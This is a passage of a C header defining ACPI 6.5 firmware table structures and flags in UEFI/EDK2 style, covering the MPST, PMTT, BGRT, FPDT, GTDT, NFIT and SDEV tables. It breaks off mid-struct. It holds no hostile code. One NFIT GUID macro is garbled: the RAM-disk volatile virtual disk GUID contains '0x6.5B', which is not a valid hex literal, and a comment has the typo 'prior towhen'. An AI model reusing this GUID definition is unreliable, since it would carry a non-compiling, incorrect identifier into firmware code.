#define EFI_ACPI_6_5_MPST_PCC_COMMAND_CODE_EXECUTE_MPST_COMMAND  0x03

///
/// ACPI MPST Memory Power command
///
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_COMMAND_GET_MEMORY_POWER_STATE      0x01
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_COMMAND_SET_MEMORY_POWER_STATE      0x02
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_COMMAND_GET_AVERAGE_POWER_CONSUMED  0x03
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_COMMAND_GET_MEMORY_ENERGY_CONSUMED  0x04

///
/// MPST Memory Power Node Table
///
typedef struct {
    UINT8    PowerStateValue;
    UINT8    PowerStateInformationIndex;
} EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE;

typedef struct {
    UINT8     Flag;
    UINT8     Reserved;
    UINT16    MemoryPowerNodeId;
    UINT32    Length;
    UINT64    AddressBase;
    UINT64    AddressLength;
    UINT32    NumberOfPowerStates;
    UINT32    NumberOfPhysicalComponents;
    // EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE              MemoryPowerState[NumberOfPowerStates];
    // UINT16                                            PhysicalComponentIdentifier[NumberOfPhysicalComponents];
} EFI_ACPI_6_5_MPST_MEMORY_POWER_STRUCTURE;

#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STRUCTURE_FLAG_ENABLE         0x01
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STRUCTURE_FLAG_POWER_MANAGED  0x02
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STRUCTURE_FLAG_HOT_PLUGGABLE  0x04

typedef struct {
    UINT16    MemoryPowerNodeCount;
    UINT8     Reserved[2];
} EFI_ACPI_6_5_MPST_MEMORY_POWER_NODE_TABLE;

///
/// MPST Memory Power State Characteristics Table
///
typedef struct {
    UINT8     PowerStateStructureID;
    UINT8     Flag;
    UINT16    Reserved;
    UINT32    AveragePowerConsumedInMPS0;
    UINT32    RelativePowerSavingToMPS0;
    UINT64    ExitLatencyToMPS0;
} EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE_CHARACTERISTICS_STRUCTURE;

#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE_CHARACTERISTICS_STRUCTURE_FLAG_MEMORY_CONTENT_PRESERVED             0x01
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE_CHARACTERISTICS_STRUCTURE_FLAG_AUTONOMOUS_MEMORY_POWER_STATE_ENTRY  0x02
#define EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE_CHARACTERISTICS_STRUCTURE_FLAG_AUTONOMOUS_MEMORY_POWER_STATE_EXIT   0x04

typedef struct {
    UINT16    MemoryPowerStateCharacteristicsCount;
    UINT8     Reserved[2];
} EFI_ACPI_6_5_MPST_MEMORY_POWER_STATE_CHARACTERISTICS_TABLE;

///
/// Platform Memory Topology Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         NumberOfMemoryDevices;
    // EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE  MemoryDeviceStructure[NumberOfMemoryDevices];
} EFI_ACPI_6_5_PLATFORM_MEMORY_TOPOLOGY_TABLE;

///
/// PMTT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_MEMORY_TOPOLOGY_TABLE_REVISION  0x02

///
/// Common Memory Device.
///
typedef struct {
    UINT8     Type;
    UINT8     Reserved;
    UINT16    Length;
    UINT16    Flags;
    UINT16    Reserved1;
    UINT32    NumberOfMemoryDevices;
    // UINT8                                   TypeSpecificData[];
    // EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE  MemoryDeviceStructure[NumberOfMemoryDevices];
} EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE;

///
/// Memory Device Type.
///
#define EFI_ACPI_6_5_PMTT_MEMORY_DEVICE_TYPE_SOCKET                0x0
#define EFI_ACPI_6_5_PMTT_MEMORY_DEVICE_TYPE_MEMORY_CONTROLLER     0x1
#define EFI_ACPI_6_5_PMTT_MEMORY_DEVICE_TYPE_DIMM                  0x2
#define EFI_ACPI_6_5_PMTT_MEMORY_DEVICE_TYPE_VENDOR_SPECIFIC_TYPE  0xFF

///
/// Socket Type Data.
///
typedef struct {
    EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE    CommonMemoryDeviceHeader;
    UINT16                                    SocketIdentifier;
    UINT16                                    Reserved;
    // EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE  MemoryDeviceStructure[];
} EFI_ACPI_6_5_PMTT_SOCKET_TYPE_DATA;

///
/// Memory Controller Type Data.
///
typedef struct {
    EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE    CommonMemoryDeviceHeader;
    UINT16                                    MemoryControllerIdentifier;
    UINT16                                    Reserved;
    // EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE  MemoryDeviceStructure[];
} EFI_ACPI_6_5_PMTT_MEMORY_CONTROLLER_TYPE_DATA;

///
/// DIMM Type Specific Data.
///
typedef struct {
    EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE    CommonMemoryDeviceHeader;
    UINT32                                    SmbiosHandle;
} EFI_ACPI_6_5_PMTT_DIMM_TYPE_SPECIFIC_DATA;

///
/// Vendor Specific Type Data.
///
typedef struct {
    EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE    CommonMemoryDeviceHeader;
    UINT8                                     TypeUuid[16];
    // EFI_ACPI_6_5_PMTT_VENDOR_SPECIFIC_TYPE_DATA   VendorSpecificData[];
    // EFI_ACPI_6_5_PMTT_COMMON_MEMORY_DEVICE        MemoryDeviceStructure[];
} EFI_ACPI_6_5_PMTT_VENDOR_SPECIFIC_TYPE_DATA;

///
/// Boot Graphics Resource Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    ///
    /// 2-bytes (16 bit) version ID. This value must be 1.
    ///
    UINT16                         Version;
    ///
    /// 1-byte status field indicating current status about the table.
    ///     Bits[7:3] = Reserved (must be zero)
    ///     Bits[2:1] = Orientation Offset. These bits describe the clockwise
    ///                 degree offset from the image's default orientation.
    ///                 [00] = 0, no offset
    ///                 [01] = 90
    ///                 [10] = 180
    ///                 [11] = 270
    ///     Bit [0] = Displayed. A one indicates the boot image graphic is
    ///               displayed.
    ///
    UINT8     Status;
    ///
    /// 1-byte enumerated type field indicating format of the image.
    ///     0 = Bitmap
    ///     1 - 255  Reserved (for future use)
    ///
    UINT8     ImageType;
    ///
    /// 8-byte (64 bit) physical address pointing to the firmware's in-memory copy
    /// of the image bitmap.
    ///
    UINT64    ImageAddress;
    ///
    /// A 4-byte (32-bit) unsigned long describing the display X-offset of the boot image.
    /// (X, Y) display offset of the top left corner of the boot image.
    /// The top left corner of the display is at offset (0, 0).
    ///
    UINT32    ImageOffsetX;
    ///
    /// A 4-byte (32-bit) unsigned long describing the display Y-offset of the boot image.
    /// (X, Y) display offset of the top left corner of the boot image.
    /// The top left corner of the display is at offset (0, 0).
    ///
    UINT32    ImageOffsetY;
} EFI_ACPI_6_5_BOOT_GRAPHICS_RESOURCE_TABLE;

///
/// BGRT Revision
///
#define EFI_ACPI_6_5_BOOT_GRAPHICS_RESOURCE_TABLE_REVISION  1

///
/// BGRT Version
///
#define EFI_ACPI_6_5_BGRT_VERSION  0x01

///
/// BGRT Status
///
#define EFI_ACPI_6_5_BGRT_STATUS_NOT_DISPLAYED  0x00
#define EFI_ACPI_6_5_BGRT_STATUS_DISPLAYED      0x01

///
/// BGRT Image Type
///
#define EFI_ACPI_6_5_BGRT_IMAGE_TYPE_BMP  0x00

///
/// FPDT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_FIRMWARE_PERFORMANCE_DATA_TABLE_REVISION  0x01

///
/// FPDT Performance Record Types
///
#define EFI_ACPI_6_5_FPDT_RECORD_TYPE_FIRMWARE_BASIC_BOOT_POINTER   0x0000
#define EFI_ACPI_6_5_FPDT_RECORD_TYPE_S3_PERFORMANCE_TABLE_POINTER  0x0001

///
/// FPDT Performance Record Revision
///
#define EFI_ACPI_6_5_FPDT_RECORD_REVISION_FIRMWARE_BASIC_BOOT_POINTER   0x01
#define EFI_ACPI_6_5_FPDT_RECORD_REVISION_S3_PERFORMANCE_TABLE_POINTER  0x01

///
/// FPDT Runtime Performance Record Types
///
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_TYPE_S3_RESUME            0x0000
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_TYPE_S3_SUSPEND           0x0001
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_TYPE_FIRMWARE_BASIC_BOOT  0x0002

///
/// FPDT Runtime Performance Record Revision
///
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_REVISION_S3_RESUME            0x01
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_REVISION_S3_SUSPEND           0x01
#define EFI_ACPI_6_5_FPDT_RUNTIME_RECORD_REVISION_FIRMWARE_BASIC_BOOT  0x02

///
/// FPDT Performance Record header
///
typedef struct {
    UINT16    Type;
    UINT8     Length;
    UINT8     Revision;
} EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER;

///
/// FPDT Performance Table header
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
} EFI_ACPI_6_5_FPDT_PERFORMANCE_TABLE_HEADER;

///
/// FPDT Firmware Basic Boot Performance Pointer Record Structure
///
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER    Header;
    UINT32                                         Reserved;
    ///
    /// 64-bit processor-relative physical address of the Basic Boot Performance Table.
    ///
    UINT64                                         BootPerformanceTablePointer;
} EFI_ACPI_6_5_FPDT_BOOT_PERFORMANCE_TABLE_POINTER_RECORD;

///
/// FPDT S3 Performance Table Pointer Record Structure
///
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER    Header;
    UINT32                                         Reserved;
    ///
    /// 64-bit processor-relative physical address of the S3 Performance Table.
    ///
    UINT64                                         S3PerformanceTablePointer;
} EFI_ACPI_6_5_FPDT_S3_PERFORMANCE_TABLE_POINTER_RECORD;

///
/// FPDT Firmware Basic Boot Performance Record Structure
///
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER    Header;
    UINT32                                         Reserved;
    ///
    /// Timer value logged at the beginning of firmware image execution.
    /// This may not always be zero or near zero.
    ///
    UINT64                                         ResetEnd;
    ///
    /// Timer value logged just prior to loading the OS boot loader into memory.
    /// For non-UEFI compatible boots, this field must be zero.
    ///
    UINT64                                         OsLoaderLoadImageStart;
    ///
    /// Timer value logged just prior to launching the previously loaded OS boot loader image.
    /// For non-UEFI compatible boots, the timer value logged will be just prior
    /// to the INT 19h handler invocation.
    ///
    UINT64                                         OsLoaderStartImageStart;
    ///
    /// Timer value logged at the point when the OS loader calls the
    /// ExitBootServices function for UEFI compatible firmware.
    /// For non-UEFI compatible boots, this field must be zero.
    ///
    UINT64                                         ExitBootServicesEntry;
    ///
    /// Timer value logged at the point just prior towhen the OS loader gaining
    /// control back from calls the ExitBootServices function for UEFI compatible firmware.
    /// For non-UEFI compatible boots, this field must be zero.
    ///
    UINT64                                         ExitBootServicesExit;
} EFI_ACPI_6_5_FPDT_FIRMWARE_BASIC_BOOT_RECORD;

///
/// FPDT Firmware Basic Boot Performance Table signature
///
#define EFI_ACPI_6_5_FPDT_BOOT_PERFORMANCE_TABLE_SIGNATURE  SIGNATURE_32('F', 'B', 'P', 'T')

//
// FPDT Firmware Basic Boot Performance Table
//
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_TABLE_HEADER    Header;
    //
    // one or more Performance Records.
    //
} EFI_ACPI_6_5_FPDT_FIRMWARE_BASIC_BOOT_TABLE;

///
/// FPDT "S3PT" S3 Performance Table
///
#define EFI_ACPI_6_5_FPDT_S3_PERFORMANCE_TABLE_SIGNATURE  SIGNATURE_32('S', '3', 'P', 'T')

//
// FPDT Firmware S3 Boot Performance Table
//
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_TABLE_HEADER    Header;
    //
    // one or more Performance Records.
    //
} EFI_ACPI_6_5_FPDT_FIRMWARE_S3_BOOT_TABLE;

///
/// FPDT Basic S3 Resume Performance Record
///
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER    Header;
    ///
    /// A count of the number of S3 resume cycles since the last full boot sequence.
    ///
    UINT32                                         ResumeCount;
    ///
    /// Timer recorded at the end of BIOS S3 resume, just prior to handoff to the
    /// OS waking vector. Only the most recent resume cycle's time is retained.
    ///
    UINT64                                         FullResume;
    ///
    /// Average timer value of all resume cycles logged since the last full boot
    /// sequence, including the most recent resume.  Note that the entire log of
    /// timer values does not need to be retained in order to calculate this average.
    ///
    UINT64                                         AverageResume;
} EFI_ACPI_6_5_FPDT_S3_RESUME_RECORD;

///
/// FPDT Basic S3 Suspend Performance Record
///
typedef struct {
    EFI_ACPI_6_5_FPDT_PERFORMANCE_RECORD_HEADER    Header;
    ///
    /// Timer value recorded at the OS write to SLP_TYP upon entry to S3.
    /// Only the most recent suspend cycle's timer value is retained.
    ///
    UINT64                                         SuspendStart;
    ///
    /// Timer value recorded at the final firmware write to SLP_TYP (or other
    /// mechanism) used to trigger hardware entry to S3.
    /// Only the most recent suspend cycle's timer value is retained.
    ///
    UINT64                                         SuspendEnd;
} EFI_ACPI_6_5_FPDT_S3_SUSPEND_RECORD;

///
/// Firmware Performance Record Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
} EFI_ACPI_6_5_FIRMWARE_PERFORMANCE_RECORD_TABLE;

///
/// Generic Timer Description Table definition.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT64                         CntControlBasePhysicalAddress;
    UINT32                         Reserved;
    UINT32                         SecurePL1TimerGSIV;
    UINT32                         SecurePL1TimerFlags;
    UINT32                         NonSecurePL1TimerGSIV;
    UINT32                         NonSecurePL1TimerFlags;
    UINT32                         VirtualTimerGSIV;
    UINT32                         VirtualTimerFlags;
    UINT32                         NonSecurePL2TimerGSIV;
    UINT32                         NonSecurePL2TimerFlags;
    UINT64                         CntReadBasePhysicalAddress;
    UINT32                         PlatformTimerCount;
    UINT32                         PlatformTimerOffset;
    UINT32                         VirtualPL2TimerGSIV;
    UINT32                         VirtualPL2TimerFlags;
} EFI_ACPI_6_5_GENERIC_TIMER_DESCRIPTION_TABLE;

///
/// GTDT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_GENERIC_TIMER_DESCRIPTION_TABLE_REVISION  0x03

///
/// Timer Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GTDT_TIMER_FLAG_TIMER_INTERRUPT_MODE      BIT0
#define EFI_ACPI_6_5_GTDT_TIMER_FLAG_TIMER_INTERRUPT_POLARITY  BIT1
#define EFI_ACPI_6_5_GTDT_TIMER_FLAG_ALWAYS_ON_CAPABILITY      BIT2

///
/// Platform Timer Type
///
#define EFI_ACPI_6_5_GTDT_GT_BLOCK              0
#define EFI_ACPI_6_5_GTDT_ARM_GENERIC_WATCHDOG  1

///
/// GT Block Structure
///
typedef struct {
    UINT8     Type;
    UINT16    Length;
    UINT8     Reserved;
    UINT64    CntCtlBase;
    UINT32    GTBlockTimerCount;
    UINT32    GTBlockTimerOffset;
} EFI_ACPI_6_5_GTDT_GT_BLOCK_STRUCTURE;

///
/// GT Block Timer Structure
///
typedef struct {
    UINT8     GTFrameNumber;
    UINT8     Reserved[3];
    UINT64    CntBaseX;
    UINT64    CntEL0BaseX;
    UINT32    GTxPhysicalTimerGSIV;
    UINT32    GTxPhysicalTimerFlags;
    UINT32    GTxVirtualTimerGSIV;
    UINT32    GTxVirtualTimerFlags;
    UINT32    GTxCommonFlags;
} EFI_ACPI_6_5_GTDT_GT_BLOCK_TIMER_STRUCTURE;

///
/// GT Block Physical Timers and Virtual Timers Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GTDT_GT_BLOCK_TIMER_FLAG_TIMER_INTERRUPT_MODE      BIT0
#define EFI_ACPI_6_5_GTDT_GT_BLOCK_TIMER_FLAG_TIMER_INTERRUPT_POLARITY  BIT1

///
/// Common Flags Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GTDT_GT_BLOCK_COMMON_FLAG_SECURE_TIMER          BIT0
#define EFI_ACPI_6_5_GTDT_GT_BLOCK_COMMON_FLAG_ALWAYS_ON_CAPABILITY  BIT1

///
/// Arm Generic Watchdog Structure
///
typedef struct {
    UINT8     Type;
    UINT16    Length;
    UINT8     Reserved;
    UINT64    RefreshFramePhysicalAddress;
    UINT64    WatchdogControlFramePhysicalAddress;
    UINT32    WatchdogTimerGSIV;
    UINT32    WatchdogTimerFlags;
} EFI_ACPI_6_5_GTDT_ARM_GENERIC_WATCHDOG_STRUCTURE;

///
/// Arm Generic Watchdog Timer Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_6_5_GTDT_ARM_GENERIC_WATCHDOG_FLAG_TIMER_INTERRUPT_MODE      BIT0
#define EFI_ACPI_6_5_GTDT_ARM_GENERIC_WATCHDOG_FLAG_TIMER_INTERRUPT_POLARITY  BIT1
#define EFI_ACPI_6_5_GTDT_ARM_GENERIC_WATCHDOG_FLAG_SECURE_TIMER              BIT2

//
// NVDIMM Firmware Interface Table definition.
//
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         Reserved;
} EFI_ACPI_6_5_NVDIMM_FIRMWARE_INTERFACE_TABLE;

//
// NFIT Version (as defined in ACPI 6.5 spec.)
//
#define EFI_ACPI_6_5_NVDIMM_FIRMWARE_INTERFACE_TABLE_REVISION  0x1

//
// Definition for NFIT Table Structure Types
//
#define EFI_ACPI_6_5_NFIT_SYSTEM_PHYSICAL_ADDRESS_RANGE_STRUCTURE_TYPE    0
#define EFI_ACPI_6_5_NFIT_NVDIMM_REGION_MAPPING_STRUCTURE_TYPE            1
#define EFI_ACPI_6_5_NFIT_INTERLEAVE_STRUCTURE_TYPE                       2
#define EFI_ACPI_6_5_NFIT_SMBIOS_MANAGEMENT_INFORMATION_STRUCTURE_TYPE    3
#define EFI_ACPI_6_5_NFIT_NVDIMM_CONTROL_REGION_STRUCTURE_TYPE            4
#define EFI_ACPI_6_5_NFIT_NVDIMM_BLOCK_DATA_WINDOW_REGION_STRUCTURE_TYPE  5
#define EFI_ACPI_6_5_NFIT_FLUSH_HINT_ADDRESS_STRUCTURE_TYPE               6
#define EFI_ACPI_6_5_NFIT_PLATFORM_CAPABILITIES_STRUCTURE_TYPE            7

//
// Definition for NFIT Structure Header
//
typedef struct {
    UINT16    Type;
    UINT16    Length;
} EFI_ACPI_6_5_NFIT_STRUCTURE_HEADER;

//
// Definition for System Physical Address Range Structure
//
#define EFI_ACPI_6_5_NFIT_SYSTEM_PHYSICAL_ADDRESS_RANGE_FLAGS_CONTROL_REGION_FOR_MANAGEMENT  BIT0
#define EFI_ACPI_6_5_NFIT_SYSTEM_PHYSICAL_ADDRESS_RANGE_FLAGS_PROXIMITY_DOMAIN_VALID         BIT1
#define EFI_ACPI_6_5_NFIT_SYSTEM_PHYSICAL_ADDRESS_RANGE_FLAGS_SPA_LOCATION_COOKIE_VALID      BIT2

#define EFI_ACPI_6_5_NFIT_GUID_VOLATILE_MEMORY_REGION                              { 0x7305944F, 0xFDDA, 0x44E3, { 0xB1, 0x6C, 0x3F, 0x22, 0xD2, 0x52, 0xE5, 0xD0 }}
#define EFI_ACPI_6_5_NFIT_GUID_BYTE_ADDRESSABLE_PERSISTENT_MEMORY_REGION           { 0x66F0D379, 0xB4F3, 0x4074, { 0xAC, 0x43, 0x0D, 0x33, 0x18, 0xB7, 0x8C, 0xDB }}
#define EFI_ACPI_6_5_NFIT_GUID_NVDIMM_CONTROL_REGION                               { 0x92F701F6, 0x13B4, 0x405D, { 0x91, 0x0B, 0x29, 0x93, 0x67, 0xE8, 0x23, 0x4C }}
#define EFI_ACPI_6_5_NFIT_GUID_NVDIMM_BLOCK_DATA_WINDOW_REGION                     { 0x91AF0530, 0x5D86, 0x470E, { 0xA6, 0xB0, 0x0A, 0x2D, 0xB9, 0x40, 0x82, 0x49 }}
#define EFI_ACPI_6_5_NFIT_GUID_RAM_DISK_SUPPORTING_VIRTUAL_DISK_REGION_VOLATILE    { 0x77AB535A, 0x45FC, 0x6.5B, { 0x55, 0x60, 0xF7, 0xB2, 0x81, 0xD1, 0xF9, 0x6E }}
#define EFI_ACPI_6_5_NFIT_GUID_RAM_DISK_SUPPORTING_VIRTUAL_CD_REGION_VOLATILE      { 0x3D5ABD30, 0x4175, 0x87CE, { 0x6D, 0x64, 0xD2, 0xAD, 0xE5, 0x23, 0xC4, 0xBB }}
#define EFI_ACPI_6_5_NFIT_GUID_RAM_DISK_SUPPORTING_VIRTUAL_DISK_REGION_PERSISTENT  { 0x5CEA02C9, 0x4D07, 0x69D3, { 0x26, 0x9F ,0x44, 0x96, 0xFB, 0xE0, 0x96, 0xF9 }}
#define EFI_ACPI_6_5_NFIT_GUID_RAM_DISK_SUPPORTING_VIRTUAL_CD_REGION_PERSISTENT    { 0x08018188, 0x42CD, 0xBB48, { 0x10, 0x0F, 0x53, 0x87, 0xD5, 0x3D, 0xED, 0x3D }}

typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT16    SPARangeStructureIndex;
    UINT16    Flags;
    UINT32    Reserved_8;
    UINT32    ProximityDomain;
    GUID      AddressRangeTypeGUID;
    UINT64    SystemPhysicalAddressRangeBase;
    UINT64    SystemPhysicalAddressRangeLength;
    UINT64    AddressRangeMemoryMappingAttribute;
    UINT64    SPALocationCookie;
} EFI_ACPI_6_5_NFIT_SYSTEM_PHYSICAL_ADDRESS_RANGE_STRUCTURE;

//
// Definition for Memory Device to System Physical Address Range Mapping Structure
//
typedef struct {
    UINT32    DIMMNumber : 4;
    UINT32    MemoryChannelNumber : 4;
    UINT32    MemoryControllerID : 4;
    UINT32    SocketID : 4;
    UINT32    NodeControllerID : 12;
    UINT32    Reserved_28 : 4;
} EFI_ACPI_6_5_NFIT_DEVICE_HANDLE;

#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_PREVIOUS_SAVE_FAIL                                      BIT0
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_LAST_RESTORE_FAIL                                       BIT1
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_PLATFORM_FLUSH_FAIL                                     BIT2
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_NOT_ARMED_PRIOR_TO_OSPM_HAND_OFF                        BIT3
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_SMART_HEALTH_EVENTS_PRIOR_OSPM_HAND_OFF                 BIT4
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_FIRMWARE_ENABLED_TO_NOTIFY_OSPM_ON_SMART_HEALTH_EVENTS  BIT5
#define EFI_ACPI_6_5_NFIT_MEMORY_DEVICE_STATE_FLAGS_FIRMWARE_NOT_MAP_NVDIMM_TO_SPA                          BIT6

typedef struct {
    UINT16                             Type;
    UINT16                             Length;
    EFI_ACPI_6_5_NFIT_DEVICE_HANDLE    NFITDeviceHandle;
    UINT16                             NVDIMMPhysicalID;
    UINT16                             NVDIMMRegionID;
    UINT16                             SPARangeStructureIndex;
    UINT16                             NVDIMMControlRegionStructureIndex;
    UINT64                             NVDIMMRegionSize;
    UINT64                             RegionOffset;
    UINT64                             NVDIMMPhysicalAddressRegionBase;
    UINT16                             InterleaveStructureIndex;
    UINT16                             InterleaveWays;
    UINT16                             NVDIMMStateFlags;
    UINT16                             Reserved_46;
} EFI_ACPI_6_5_NFIT_NVDIMM_REGION_MAPPING_STRUCTURE;

//
// Definition for Interleave Structure
//
typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT16    InterleaveStructureIndex;
    UINT16    Reserved_6;
    UINT32    NumberOfLines;
    UINT32    LineSize;
    // UINT32                                      LineOffset[NumberOfLines];
} EFI_ACPI_6_5_NFIT_INTERLEAVE_STRUCTURE;

//
// Definition for SMBIOS Management Information Structure
//
typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT32    Reserved_4;
    // UINT8                                       Data[];
} EFI_ACPI_6_5_NFIT_SMBIOS_MANAGEMENT_INFORMATION_STRUCTURE;

//
// Definition for NVDIMM Control Region Structure
//
#define EFI_ACPI_6_5_NFIT_NVDIMM_CONTROL_REGION_VALID_FIELDS_MANUFACTURING  BIT0

#define EFI_ACPI_6_5_NFIT_NVDIMM_CONTROL_REGION_FLAGS_BLOCK_DATA_WINDOWS_BUFFERED  BIT0

typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT16    NVDIMMControlRegionStructureIndex;
    UINT16    VendorID;
    UINT16    DeviceID;
    UINT16    RevisionID;
    UINT16    SubsystemVendorID;
    UINT16    SubsystemDeviceID;
    UINT16    SubsystemRevisionID;
    UINT8     ValidFields;
    UINT8     ManufacturingLocation;
    UINT16    ManufacturingDate;
    UINT8     Reserved_22[2];
    UINT32    SerialNumber;
    UINT16    RegionFormatInterfaceCode;
    UINT16    NumberOfBlockControlWindows;
    UINT64    SizeOfBlockControlWindow;
    UINT64    CommandRegisterOffsetInBlockControlWindow;
    UINT64    SizeOfCommandRegisterInBlockControlWindows;
    UINT64    StatusRegisterOffsetInBlockControlWindow;
    UINT64    SizeOfStatusRegisterInBlockControlWindows;
    UINT16    NVDIMMControlRegionFlag;
    UINT8     Reserved_74[6];
} EFI_ACPI_6_5_NFIT_NVDIMM_CONTROL_REGION_STRUCTURE;

//
// Definition for NVDIMM Block Data Window Region Structure
//
typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT16    NVDIMMControlRegionStructureIndex;
    UINT16    NumberOfBlockDataWindows;
    UINT64    BlockDataWindowStartOffset;
    UINT64    SizeOfBlockDataWindow;
    UINT64    BlockAccessibleMemoryCapacity;
    UINT64    BeginningAddressOfFirstBlockInBlockAccessibleMemory;
} EFI_ACPI_6_5_NFIT_NVDIMM_BLOCK_DATA_WINDOW_REGION_STRUCTURE;

//
// Definition for Flush Hint Address Structure
//
typedef struct {
    UINT16                             Type;
    UINT16                             Length;
    EFI_ACPI_6_5_NFIT_DEVICE_HANDLE    NFITDeviceHandle;
    UINT16                             NumberOfFlushHintAddresses;
    UINT8                              Reserved_10[6];
    // UINT64                                      FlushHintAddress[NumberOfFlushHintAddresses];
} EFI_ACPI_6_5_NFIT_FLUSH_HINT_ADDRESS_STRUCTURE;

//
// Definition for Platform Capabilities Structure
//
typedef struct {
    UINT16    Type;
    UINT16    Length;
    UINT8     HighestValidCapability;
    UINT8     Reserved_5[3];
    UINT32    Capabilities;
    UINT8     Reserved_12[4];
} EFI_ACPI_6_5_NFIT_PLATFORM_CAPABILITIES_STRUCTURE;

#define EFI_ACPI_6_5_NFIT_PLATFORM_CAPABILITY_CPU_CACHE_FLUSH_TO_NVDIMM_DURABILITY_ON_POWER_LOSS          BIT0
#define EFI_ACPI_6_5_NFIT_PLATFORM_CAPABILITY_MEMORY_CONTROLLER_FLUSH_TO_NVDIMM_DURABILITY_ON_POWER_LOSS  BIT1
#define EFI_ACPI_6_5_NFIT_PLATFORM_CAPABILITY_BYTE_ADDRESSABLE_PERSISTENT_MEMORY_HARDWARE_MIRRORING       BIT2

///
/// Secure DEVices Table (SDEV)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
} EFI_ACPI_6_5_SECURE_DEVICES_TABLE_HEADER;

///
/// SDEV Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_SECURE_DEVICES_TABLE_REVISION  0x01

///
/// Secure Device types
///
#define EFI_ACPI_6_5_SDEV_TYPE_ACPI_NAMESPACE_DEVICE  0x00
#define EFI_ACPI_6_5_SDEV_TYPE_PCIE_ENDPOINT_DEVICE   0x01

///
/// Secure Device flags
///
#define EFI_ACPI_6_5_SDEV_FLAG_ALLOW_HANDOFF                     BIT0
#define EFI_ACPI_6_5_SDEV_FLAG_SECURE_ACCESS_COMPONENTS_PRESENT  BIT1

///
/// SDEV Structure Header
///
typedef struct {
    UINT8     Type;
    UINT8     Flags;
    UINT16    Length;
} EFI_ACPI_6_5_SDEV_STRUCTURE_HEADER;

///
/// ACPI_NAMESPACE_DEVICE based Secure Device Structure
///
typedef struct {
    EFI_ACPI_6_5_SDEV_STRUCTURE_HEADER    Header;
    UINT16                                DeviceIdentifierOffset;
    UINT16                                DeviceIdentifierLength;
    UINT16                                VendorSpecificDataOffset;
    UINT16                                VendorSpecificDataLength;
    UINT16                                SecureAccessComponentsOffset;
    UINT16                                SecureAccessComponentsLength;
} EFI_ACPI_6_5_SDEV_STRUCTURE_ACPI_NAMESPACE_DEVICE;

///
/// Secure Access Component Types
///
#define EFI_ACPI_6_5_SDEV_SECURE_ACCESS_COMPONENT_TYPE_IDENTIFICATION  0x00
#define EFI_ACPI_6_5_SDEV_SECURE_ACCESS_COMPONENT_TYPE_MEMORY          0x01

///
/// Identification Based Secure Access Component
///
typedef struct {
    EFI_ACPI_6_5_SDEV_STRUCTURE_HEADER    Header;
    UINT16                                HardwareIdentifierOffset;
    UINT16                                HardwareIdentifierLength;
    UINT16                                SubsystemIdentifierOffset;
    UINT16                                SubsystemIdentifierLength;
    UINT16                                HardwareRevision;
    UINT8                                 HardwareRevisionPresent;
    UINT8                                 ClassCodePresent;
